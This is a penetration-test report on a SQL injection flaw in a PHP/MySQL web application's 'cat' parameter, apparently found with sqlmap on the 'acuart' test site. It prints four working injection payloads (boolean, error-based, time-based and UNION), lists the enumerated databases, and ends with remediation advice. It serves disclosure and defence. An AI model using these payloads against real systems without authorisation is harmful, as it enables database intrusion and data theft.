# SQL Injection Vulnerability Report

## Overview

This document reports a SQL Injection vulnerability identified within a web application. The vulnerability was discovered using sqlmap, an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

## Vulnerability Details

- **Injection Point:** HTTP GET parameter `cat`
- **Injection Type(s):**
  - Boolean-based blind
  - Error-based
  - Time-based blind
  - UNION query
- **Affected System:** Web application
- **Web Server Operating System:** Linux Ubuntu
- **Web Application Technology:** PHP 5.6.40, Nginx 1.19.0
- **Back-end DBMS:** MySQL >= 5.6

## Injection Points and Payloads

1. **Boolean-Based Blind**
   - Payload: `cat=1 AND 3131=3131`

2. **Error-Based**
   - Payload: `cat=1 AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(2030=2030,1))),0x716a766271),2030)`

3. **Time-Based Blind**
   - Payload: `cat=1 AND (SELECT 8897 FROM (SELECT(SLEEP(5)))fgal)`

4. **UNION Query**
   - Payload: `cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71627a7a71,0x5652584366446a534e787444574e44695363764c6848636b774a4748595a63496f576969634e4770,0x716a766271),NULL,NULL,NULL,NULL-- -`

## Database Details

- **Available Databases:** acuart, information_schema
- **Information Schema Tables:** 79 tables including `ADMINISTRABLE_ROLE_AUTHORIZATIONS`, `APPLICABLE_ROLES`, `CHARACTER_SETS`, etc.
- **Table 'FILES':** 38 columns including `AUTOEXTEND_SIZE`, `AVG_ROW_LENGTH`, `CHECKSUM`, etc.

## Recommendations

1. **Parameter Sanitization:** Ensure all user-supplied data is correctly sanitized to prevent the execution of unintended SQL commands.
2. **Prepared Statements:** Use prepared statements with parameterized queries to ensure SQL code and data are separated.
3. **Error Handling:** Configure proper error handling to prevent detailed error messages from being sent to the client, which can be utilized for malicious purposes.
4. **Security Patching:** Regularly update the web application framework, PHP version, and any plugins to protect against known vulnerabilities.
5. **Security Testing:** Perform regular security assessments and penetration testing to identify and mitigate vulnerabilities.

## Conclusion

This report highlights a critical SQL Injection vulnerability that requires immediate attention. Addressing this vulnerability is essential for maintaining the integrity, confidentiality, and availability of the application's data.
